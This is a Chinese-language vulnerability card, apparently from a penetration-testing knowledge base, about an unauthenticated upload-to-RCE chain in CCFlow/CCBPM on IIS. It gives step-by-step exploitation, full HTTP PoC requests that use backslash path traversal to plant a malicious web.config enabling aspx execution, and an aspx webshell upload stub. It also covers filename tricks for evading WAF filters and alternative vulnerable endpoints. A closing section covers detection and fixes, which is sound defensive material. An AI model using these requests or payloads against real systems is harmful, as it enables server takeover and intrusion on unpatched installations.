---
id: web-generic-file-upload-ccflow-iis-webconfig-aspx
title: CCFlow/CCBPM 未授权文件上传：文件名按最后 / 截断、反斜杠穿越并上传 web.config 开启 aspx 解析 RCE
type: scenario
domain: web
path: web/generic/file-upload
technique: filename-slash-parsing-backslash-traversal
tags:
- dotnet
- ccfpm
- low-code
- file-upload
- path-traversal
- web-config
- aspx
- iis
- rce
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V54
  verified_at: '2026-11-05T08:59:23+08:00'
  notes: 已对照原文及61张图核对：图23/24 BigScreen.upload 仅按最后一个 / 截取文件名并去空格，反斜杠未处理，savefileFullPath=fileFullPath+/+GUID+fileName；图25 上传 55.aspx 落盘；图28 根 web.config 由 aspNetCore 通配处理器接管；图29/30 应用池为 .NET CLR v4.0；图51 Knowledge_UploadFile_MinAth 直接使用 file.FileName 拼 guid+'.'+fileName，图58/59 显示 web.config/test.aspx 落在 DataUser/UploadFile；图32/55 连接 shell，whoami=iis apppool\defaultapppool。修正提示：卡内'多个入口都只用最后一个 / 截取文件名'表述过宽，Knowledge_UploadFile_MinAth、FrMBBS_UploadFile 实际未截断而是直接使用原始文件名，共同缺陷是只处理 / 不处理 \；不影响利用结论。PoC 未在本机执行。
url: /docs/web/generic/file-upload/web-generic-file-upload-ccflow-iis-webconfig-aspx/
draft: false
kb_aliases:
- CCFlow 任意文件上传
- CCBPM 未授权上传 getshell
- Knowledge_UploadFile_MinAth 上传
- Entity_Upload 上传
- 上传 web.config 解析 aspx
- IIS 应用程序池 .NET CLR getshell
---

## 一句话结论

CCFlow/CCBPM 的多个上传入口（`Knowledge_UploadFile_MinAth`、`Entity_Upload`、`FrMBBS_UploadFile`、`UploadFile`、`BigAPI/upload`）都只用“最后一个 `/`”截取文件名：在 Windows 上 `\` 同样是路径分隔符却未被处理，攻击者用 `\..\..\..\UploadFile\web.config` 之类的文件名即可穿越到 Web 可访问目录；再上传一个子目录 `web.config` 移除 `aspNetCore` 处理器并为 `*.aspx` 注册 `PageHandlerFactory`，最后上传 aspx 马即可在 IIS 下执行（部分入口完全不需要登录，且文件在后续报错前已保存）。

## 原理

- **文件名解析缺陷**：典型代码 `fileName = HttpContextHelper.GetNameByIdx(0); if (fileName.IndexOf("/") > -1) { fileName = fileName.Substring(fileName.LastIndexOf("/") + 1); fileName = fileName.Replace(" ", ""); }`。它只处理正斜杠 `/`，而 Windows 的文件系统同时把 `\` 当作目录分隔符；因此 `..\..\..\UploadFile\web.config` 不会被截断，会原样带入 `savePath`，在拼接 `basePath + filepath + "/" + GUID + fileName` 时产生向上穿越。`Replace(" ","")` 只去空格，反而可用来拆开 `web.config`、`aspx` 等 WAF 关键字。
- **上传目录在 Web 根**：默认 `basePath = SystemConfig.PathOfDataUser`，上传到 `UploadFile/...`（如 `DataUser/UploadFile`）；该目录可通过 `/DataUser/UploadFile/...` 访问，且应用池允许执行 .NET。
- **web.config 提权解析**：项目根 `web.config` 用 `<add name="aspNetCore" path="*" ... modules="AspNetCoreModuleV2">` 接管所有请求，默认不解析 aspx。攻击者上传子目录 `web.config`：
  - `<remove name="aspNetCore" />` 移除父级通配处理器；
  - `<remove name="PageHandlerFactory-Integrated-4.0" />` 避免重复；
  - `<add name="PageHandlerFactory-Integrated-4.0" path="*.aspx" verb="GET,HEAD,POST,DEBUG" type="System.Web.UI.PageHandlerFactory" ... preCondition="integratedMode,runtimeVersionv4.0" />`。
  该子目录下的 `*.aspx` 随即由 ASP.NET 解析。
- **上传时机**：`Knowledge_UploadFile_MinAth` 等入口先 `UploadFile(file, savePath)` 保存文件，再执行附件入库等后续逻辑；原文请求返回 `err@调用类...登录信息丢失`，但磁盘上 `web.config` 与 `test.aspx` 已写入成功——即“先落盘、后报错”，错误响应不代表上传失败。
- **执行**：上传的 aspx 是 AES 加密的 Behinder/哥斯拉式内存马（`Context.Application["payload"]` 加载 Assembly，`LY` 类反射执行），访问后即可命令执行；原文连接成功，`whoami` 为 `iis apppool\defaultapppool`。前提是 IIS 应用程序池的 .NET CLR 版本不是“无托管代码”。

## 触发条件

- 目标为 CCFlow.NetCore / CCBPM（原文“某低代码 BPM”），运行在 IIS + ASP.NET Core；
- 上传入口可达：`/WF/Comm/ProcessRequest` 的未授权 handler（Knowledge/Entity/FrMBBS/UploadFile）或带有效 Satoken 的 `/WF/BigAPI/upload`；
- `DataUser/UploadFile` 等上传目录位于 Web 根且可写；应用池启用 .NET CLR（v4.0 集成模式）；
- 目标未禁止上传 `web.config`/`aspx`，或过滤可被空格/反斜杠绕过。

## 利用步骤

1. 选择一个未授权上传入口，例如 `DoType=HttpHandler&DoMethod=Knowledge_UploadFile_MinAth&HttpHandlerName=BP.CCOA.HttpHandler.CCOA_Knowledge`。
2. 先上传子目录 `web.config`（文件名如 `\..\..\..\UploadFile\web.config`），内容移除 `aspNetCore` 并注册 `*.aspx` 的 PageHandlerFactory；即使响应报错也去访问确认文件已落地。
3. 再上传 `test.aspx`（同样用 `\..\..\..\UploadFile\test.aspx`），内容为内存马/一句话。
4. 访问 `/DataUser/UploadFile/web.config` 所在目录下的 `/DataUser/UploadFile/test.aspx`，连接 shell。
5. 若应用池为“无托管代码”，web.config 无法让 aspx 解析，则改用 `.ashx`/其他已注册处理器或换其他利用面。

## PoC

```http
POST /WF/Comm/ProcessRequest?DoType=HttpHandler&DoMethod=Knowledge_UploadFile_MinAth&HttpHandlerName=BP.CCOA.HttpHandler.CCOA_Knowledge HTTP/1.1
Host: <target>
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryKxyqt53NF1GExOvl

------WebKitFormBoundaryKxyqt53NF1GExOvl
Content-Disposition: form-data; name="file"; filename="\..\..\..\UploadFile\web.config"
Content-Type: image/jpeg

<?xml version="1.0" encoding="utf-8"?>
<configuration>
  <system.webServer>
    <handlers>
      <remove name="aspNetCore" />
      <remove name="PageHandlerFactory-Integrated-4.0" />
      <add name="PageHandlerFactory-Integrated-4.0"
           path="*.aspx"
           verb="GET,HEAD,POST,DEBUG"
           type="System.Web.UI.PageHandlerFactory"
           resourceType="Unspecified"
           preCondition="integratedMode,runtimeVersionv4.0" />
    </handlers>
  </system.webServer>
</configuration>
------WebKitFormBoundaryKxyqt53NF1GExOvl--
```

```http
POST /WF/Comm/ProcessRequest?DoType=HttpHandler&DoMethod=Knowledge_UploadFile_MinAth&HttpHandlerName=BP.CCOA.HttpHandler.CCOA_Knowledge HTTP/1.1
Host: <target>
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryKxyqt53NF1GExOvl

------WebKitFormBoundaryKxyqt53NF1GExOvl
Content-Disposition: form-data; name="file"; filename="\..\..\..\UploadFile\test.aspx"
Content-Type: image/jpeg

<%@ Page Language="C#"%><% ... %>
------WebKitFormBoundaryKxyqt53NF1GExOvl--
```

随后访问 `/DataUser/UploadFile/test.aspx`。原文使用的 aspx 为 AES + Assembly.Load 内存马，连接后 `whoami` 返回 `iis apppool\defaultapppool`。

## 变体与关联

- 入口变体：`Entity_Upload`（`BP.WF.HttpHandler.WF_CommTS`，文件名 `\..\UploadFile\444.aspx`）、`FrMBBS_UploadFile`（`BP.CCBill.HttpHandler.CCBill_Components`）、`UploadFile`（`BP.WF.HttpHandler.WF_TSDev2Interface`，用 `fileName` 参数指定 `555.aspx`）、`BigAPI/upload`（需 Satoken，文件名 `\ \ . . \ \ ... \55.a s p x` 用空格拆关键字）。
- 文件名变体：`..\`、`\..\..\`、多组 `\ \ . .` 与空格；过滤只去空格/只认 `/` 时均可尝试。
- 关联：[[web-generic-file-upload-dotnet-uploadpicture-aspx-webshell]]（.NET 上传 aspx 马）、[[web-generic-file-upload-extension-zero-check]]（后缀零校验）；本场景增量是“反斜杠绕过最后 `/` 截断 + 上传 web.config 改变 IIS 解析”。
- 前置链：未授权入口可通过 [[web-generic-auth-ccflow-processrequest-reflection-token-bypass]] 的反射网关到达。

## 检测与防御

- 检测：上传请求文件名含 `\..\`、`web.config`、`.aspx`、`.ashx`，或含大量空格/反斜杠；响应报错但目录出现新文件；`DataUser/UploadFile` 下出现 `web.config` 或 aspx；IIS 日志出现对 `/DataUser/UploadFile/*.aspx` 的访问；应用池进程派生异常子进程。
- 修复：文件名用 `Path.GetFileName` 并同时规范化 `/` 与 `\`，拒绝 `..`、绝对路径和控制字符；上传扩展名白名单 + 内容校验；禁止上传 `web.config`/`*.config`；上传目录移出 Web 根或禁用脚本执行。
- 加固：IIS 请求筛选禁止 `web.config` 上传；应用池使用低权限账号且不给上传目录写执行权限；对 `/WF/Comm/ProcessRequest` 的上传方法做鉴权与白名单；WAF 拦截 `web.config`、`aspx` 与反斜杠穿越特征。
